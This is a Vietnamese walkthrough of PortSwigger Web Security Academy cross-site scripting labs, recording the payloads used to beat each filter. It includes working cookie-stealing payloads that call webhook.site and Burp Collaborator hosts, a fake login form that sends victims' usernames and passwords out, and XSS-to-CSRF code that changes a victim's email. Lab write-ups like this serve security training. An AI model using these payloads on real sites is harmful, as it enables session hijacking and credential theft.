# XSS 

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded

Sau khi tìm kiếm một giá trị ngẫu nhiên trên trang web ta thấy nó được reflected vào trong thuộc tính 
![image](https://user-images.githubusercontent.com/68894302/170344608-2a4a5dcb-b9df-4479-965e-0de164ade5f0.png)

**Description**
> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

**Explanation**
Không thể sử dụng thẻ html vì bị encode do đó sử dụng trình sự kiện để thực hiện việc XSS
```
https://accf1f0a1ec2890fc01a2f5e00fd00f4.web-security-academy.net/?search=%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
Thấy một số thẻ bị encode url 
```
<input type="text" placeholder="Search the blog..." name="search" value="" &lt;script&gt;alert(1)&lt;="" script&gt;"="">
```
Nếu nhập vào `x"` nó sẽ trở thành
```
<input type="text" placeholder="Search the blog..." name="search" value="x" "="">
```
Bypass bằng cách sử dụng dấu `"` để đóng giá trị `value` và sử dụng trình sự kiện `onmouseover` để thực thi hàm alert. Khi con trỏ trỏ lại vị trí tìm kiếm thì popup sẽ được bật lên
Payload:
```
test"onmouseover="alert(1)
```
![image](https://user-images.githubusercontent.com/68894302/170353058-e061cf18-95ea-48cc-92a7-d48a19a09183.png)

----

## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

Ở challenge này chúng ta thấy khi tìm kiếm 1 giá trị bất kì thì giá trị đó được lưu vào đoạn code javascript sau
![image](https://user-images.githubusercontent.com/68894302/170521772-051696f6-17a8-4aa4-a0fd-70389ecc33f5.png)

Dùng dấu nháy đơn để escape ra khỏi đó và dấu `;` để kết thúc 1 câu trong javascrip. Payload để thực thi đoạn mã javascript như sau
```
';alert(1);//'
```
![image](https://user-images.githubusercontent.com/68894302/170524018-9ed0b1ca-351b-4ac3-b9f7-1fe1d979cb86.png)


## Lab: 

Chức năng bình luận có vẻ tồn tại lỗ hổng XSS tại phần để lại bình luận. Đây là phần body sau khi bắt từ burp suite:
![image](https://user-images.githubusercontent.com/68894302/170539152-c664fb5e-b7c5-4ae1-a687-9bd0c9ff8b49.png)

Và sau đó quay lại một thông báo popup hiện lên. 

![image](https://user-images.githubusercontent.com/68894302/170539389-09ec295b-dbae-4194-97ca-0f9e6fdcda55.png)

Payload phần comment như sau:
```
<img src=x onerror="this.src='https://webhook.site/85314239-8e84-48ea-aa6e-f863eed00ded/?c='+document.cookie; this.removeAttribute('onerror');">
```
Vì challenge này không cho phép trang web bên trang thứ 3 nên phải dùng burp collab
```
<img src=x onerror="this.src='http://929bwso8dq7aig0yv68ymojf268wwl.burpcollaborator.net/?c='+document.cookie; this.removeAttribute('onerror');">
```
Sau khi poll thì chúng ta nhận được giá trị cookie trong phần request, dùng cookie đó để thay thế cookie hiện tại.
![image](https://user-images.githubusercontent.com/68894302/170543325-a4f3c92a-7afc-4ae5-9c8a-63a7e1cc6923.png)

---
## Lab: Exploiting cross-site scripting to capture passwords
> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Đây là một challenge liên quan đến store XSS tức là đoạn mã javascript sẽ được lưu lại kể cả sau khi session hết hạn. 

Vậy làm thế nào để lấy được tài khoản người dùng?
Bây giờ chỉ còn cách tạo các thẻ html để tạo một form login giả trong chức năng bình luận
payload như sau:
```
<input required="" type="username" name="username">
<input required="" type="password" name="password">
<script>document.location='http://pa3atd45zyl03tnxu6h7lw42ctik69.burpcollaborator.net/?'+document.getElementsByName("username")[0].value 'password='+document.getElementsByName("password")[0].value</script>
```
Nhưng nhận được kết quả chưa có thông tin gì về username và password có thể do quá trình tạo `document.location` tính năng tự động điền chưa được thực hiện.
![image](https://user-images.githubusercontent.com/68894302/170563118-1459c91e-e626-4d26-8ed9-92baaf1a5e77.png)
Dùng thuộc tính `onchange` vào trong thẻ input của password để quan sát sự thay đổi .
```
<input required="" type="username" name="username">
<input required="" type="password" name="password" onchange="document.location='http://0421a7pdyngvuefhurnsavp12s8iw7.burpcollaborator.net/?user='+document.getElementsByName('username')[0].value+'pass='+document.getElementsByName('password')[0].value">
```
Và chúng ta nhận được thông tin về username và password
![image](https://user-images.githubusercontent.com/68894302/170564092-867762cb-f694-4cd1-a3d0-8763dd067b5f.png)


---
## Lab: Exploiting XSS to perform CSRF

Ở bài này chúng ta sẽ sử dụng đối tượng XMLHttpRequest của AJAX để trao đổi dữ liệu với máy chủ thông qua XSS dẫn tới CSRF

``` javascript
</script>
//AJAX XMLHttpRequest object
var xhttp = new XMLHttpRequest(); 
xhttp.onload = function(){
    var token_csrf = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeRequest = new XMLHttpRequest();
    changeRequest.open("POST",'/my-account/change-email',true);
    changeRequest.send('email=test@gmail.com' + '&csrf=' + token_csrf);
};

xhttp.open("GET", "/my-account", true);
xhttp.send();
</script>
```
Đoạn mã javascript ở trên đã tương tác với máy chủ dưới nền sau khi nhận được request sau đó thay đổi email của bất kì người dùng nào thành `test@gmail.com` 

---
## Lab: Reflected XSS with event handlers and href attributes blocked

Có một blacklist các tag bị chặn, sau khi bruteforce thì thấy vẫn còn một số thẻ không bị chặn như
![image](https://user-images.githubusercontent.com/68894302/170742483-84ddcad4-53ac-4e10-9ee7-8f496bbe681f.png)
Nhưng khi thử với thuộc tính `href` thì có vẻ như nó đã bị chặn
```
https://acd51f871f0b90a2c0746c2f008c00e1.web-security-academy.net/?search=%3Ca+href%3D%22https%3A%2F%2F14.rs%22%3EClick%3C%2Fa%3E

(https://acd51f871f0b90a2c0746c2f008c00e1.web-security-academy.net/?search=<a href="https://14.rs">Click</a>)
```
Nhưng thẻ `<animate>` có một số thuộc tính rất là `attributeName` và `values` để tạo hoạt ảnh cho phần tử theo sạng sau
```
<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
  <rect width="10" height="10">
    <animate attributeName="rx" values="0;5;0" dur="10s" repeatCount="indefinite" />
  </rect>
</svg>
```
Chúng ta có thể sử dụng thẻ animate để định nghĩa thuộc tính mới là href và value của nó là `javascript:alert()` để bỏ qua bộ lọc. 
Payload:
```
"><svg >
  <a width=10 height=10>
    <animate attributeName="href" values="javascript:alert()" />
    <text>Click</text>
  </a>
</svg>
```

---
## Lab: DOM XSS in document.write sink using source location.search

``` javascript

function trackSearch(query) {
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
trackSearch(query);
}
```
Chuỗi tìm kiếm sẽ được được lưu vào biến search và sau đó được gọi sau đó `document.write` sẽ thực hiện việc in ra chuỗi tìm kiếm đó, tức là chúng ta có thể đưa vào một đoạn mã javascript trực tiếp vào trong DOM để thực thi xss
payload:
```
'><svg/onload=alert()>
```

---
## Lab: DOM XSS in document.write sink using source location.search inside a select element

![image](https://user-images.githubusercontent.com/68894302/170884298-cb05e6a9-ad03-47a7-8a25-70f46046b0e6.png)
 
Biến `store`có thể dễ dàng sử đổi tên của store sau đó escape khỏi các tag mở và thực thi `alert()`
![image](https://user-images.githubusercontent.com/68894302/170884574-cd7e6131-c6e7-4909-918a-b8b3ef173137.png)

payload
```
"></select><svg/onload=alert()>
```

---
## Lab: DOM XSS in innerHTML sink using source location.search

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```
`document.getElementById('searchMessage').innerHTML` nó sẽ lấy toàn bộ html content của id = `searchMessage` và gán cho query
payload:
```
<img src=x onerror=alert()>
```

## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
> This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
To solve this lab, make the "back" link alert document.cookie.

Thử thách yêu cầu lấy giá trị cookie qua jquery. Jquery là một thư viện được viết bằng javascript và tích hợp nhiều module trong đó có DOM
Các kí tự `<,> bị` encode thành `&lt; &gt;` vì thế chúng ta không thể sử dụng các thẻ tag như cách thông thường
Chuyển sang phần submit feedback, view source thì thấy đoạn code sau để sử lí việc gán `returnPath` vào thuộc tính `href`
```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
Thuộc tính href để chỉ định path hoặc url mà chúng ta có thể chuyển đến
![image](https://user-images.githubusercontent.com/68894302/170914559-fa694026-57b3-4f85-b13b-f679f6dc62b5.png)

Có thể thực hiejn redirect để có thể thực thi mã tùy ý bằng cách `javascript:alert()`
![image](https://user-images.githubusercontent.com/68894302/170915110-e0b38412-b6d3-4cab-b603-a15fbe50001a.png)

---
## Lab: DOM XSS in jQuery selector sink using a hashchange event
> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

Trong bài lab này hàm `$()` của jquery,  `window.location` và sự kiện `hashchange` được sử dụng để nhận dạng phân đoạn URL đã thay đổi (phần URL được bắt đầu và theo sau bằng dấu #)
![image](https://user-images.githubusercontent.com/68894302/171024888-a80b60a0-de7f-44a6-bc0d-be16b6ae9968.png)

Trên exploit server chúng ta sử dụng payload sau làm phần body và store lại 
```
<iframe src="https://acaf1f2d1ea16f7ec08301ea004500aa.web-security-academy.net/#" onload="this.src='<img src=x onerror=print()'"></iframe>
```
Sau khi view exploit thì ta thấy hàm `print()` được thực thi

---
## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

Challenge này khá đơn giản ở chỗ điền tên website ban đầu thử dùng `<script>confirm()</script>` bắt request qua burpsuite và ta thấy các kí tự đặc biệt bị url encode, vì thế chúng ta có thể bypass bằng cách dùng `javascript:alert()` để gọi hàm `alert()`

---
## Lab: Reflected XSS with some SVG markup allowed
Sau khi thử `<script>alert()</script` thì có thông báo lỗi 
![image](https://user-images.githubusercontent.com/68894302/171033422-13d4479a-108e-4282-aba2-2d4f6ef497f8.png)
Thử bruteforce thì thấy vẫn còn một số thẻ không ở trong blacklist
![image](https://user-images.githubusercontent.com/68894302/171033607-f44600c2-d5f1-4e8e-9273-8614d7ad0f5f.png)

Có tag rồi thì ta có thể dễ dành thực thi mã javascript nhưng
![image](https://user-images.githubusercontent.com/68894302/171033985-5e7f2b9c-7c3a-459e-865a-f26d9d9a9b1b.png)

Tiếp tục bruteforce event các event 
![image](https://user-images.githubusercontent.com/68894302/171032508-ba2cbd69-449f-4271-8572-f289d0d4e6ba.png)
`onbegin` là event duy nhất không bị filter.

Đây là payload cuối cùng:
```
'<svg><animatetransform onbegin='alert()'>
```
Chúng ta có thể sử dụng tag `animatetransform` kết hợp với `svg` để có thể kích hoạt onbegin

---
## Lab: Reflected XSS in canonnical link tag
> This lab reflects user input in a canonical link tag and escapes angle brackets.
To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.
To assist with your exploit, you can assume that the simulated user will press the following key combinations:
    ALT+SHIFT+X
    CTRL+ALT+X
    Alt+X
Please note that the intended solution to this lab is only possible in Chrome. 

Các công cụ tìm kieeks như Google hoạt động bằng cách "crawling" (thu thập dữ liệu) thông qua danh sách rất lớn các trang web, phân tích nội dung trên trang và phân loại kết quả thông qua cơ sở dữ liệu tham chiếu chéo của các biến như URL của trang web và ngày sửa đổi cuối cùn cho thời gian chạy nhanh khi bất kì truy vấn nào được nhập vào công cụ.
Canonical link là một chỉ định đặc biệt được nhúng vào mã của trang web để cho biết một trang nào đó sẽ là nguồn gốc thông tin khi công cụ tìm kiến hiển thị các kết quả cho người dùng

Trong thử thách này chúng ta thấy rằng trang web cũng sử dụng canonical link được đặt ở vị trí nằm trong ` <link rel="canonical" href='https://accc1fb21e127be5c0a411e700b800db.web-security-academy.net/'/>`


![image](https://user-images.githubusercontent.com/68894302/171045018-80c70a0f-8e3a-4a2b-b42a-df7db4a4b699.png)

Google search cách sử dụng acnonical link 
![image](https://user-images.githubusercontent.com/68894302/171047053-885178b4-e567-4110-9e6e-f2573821239d.png)

Trông nó cũng khá giống với trang web đang làm, vậy thì chúng ta sẽ thêm một dấu nháy đơn `'` để escape khỏi giá trị href và thêm vào các thuộc tính accesskey, onload
![image](https://user-images.githubusercontent.com/68894302/171047524-a3216dfa-ec62-4961-ad99-440432fd162d.png)
thuộc tính `accesskey` để giúp người dùng khi nhấn tổ hợp phím Crtl+shift+[giá trị] thì nó sẽ thực thi hàm trong onload
![image](https://user-images.githubusercontent.com/68894302/171047570-aab369d7-aa38-4f1c-872e-5aaed30b60ae.png)

---
## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Khi thử tìm kiếm các tag ở phần view source thấy rằng các kí tự như `< > / ` bị encode url, nên có thể sử dụng angularJS expression
Cú pháp của nó như sau
![image](https://user-images.githubusercontent.com/68894302/171048235-6e8d06a2-7c43-43ac-a9eb-52489588b9da.png)

Nội dung toàn bộ phần đoạn mã được thực hiện bên trong 2 cặp ngoặc nhọn.
Chúng ta có thể sử dụng payload sau để thực thi `alert`
```
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
```
![image](https://user-images.githubusercontent.com/68894302/171048784-3ea44e20-b88c-40cd-88ca-e73a84e965e3.png)
Nhìn khá phức tạp thực ra có một số cách để giải quyết đơn giản hơn nhưng đây là trường hợp có thể bỏ qua một số waf

--- 
## Lab: Stored DOM XSS

Dùng dev tool check phần source code bên `LoadComment..` ta thấy hàm escapeHTM sử dụng replace để thay thế `<` thành `&lt;` và `>` thành `&gt;`
![image](https://user-images.githubusercontent.com/68894302/171052595-4e1ad843-70c4-4484-b64f-337747fa7086.png)

Tuy nhiên thì hàm này chỉ thay thế ở lần match đầu tiên thôi nên ta sẽ dễ dàng bypass nó.
![image](https://user-images.githubusercontent.com/68894302/171052459-42485e82-9bbb-46b4-bd30-ccb789fd0340.png)

payload
```
<><img src=xxx onerror=alert()>
```
---
## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

```
'</script><svg/onload=alert()>
```
Dùng `'</script>` để escape `<script>` sau đó chuỗi đầu vào được phản ánh trong đoạn mã javascript
![image](https://user-images.githubusercontent.com/68894302/171054303-6ec39690-7926-4bd6-9892-b40523010af3.png)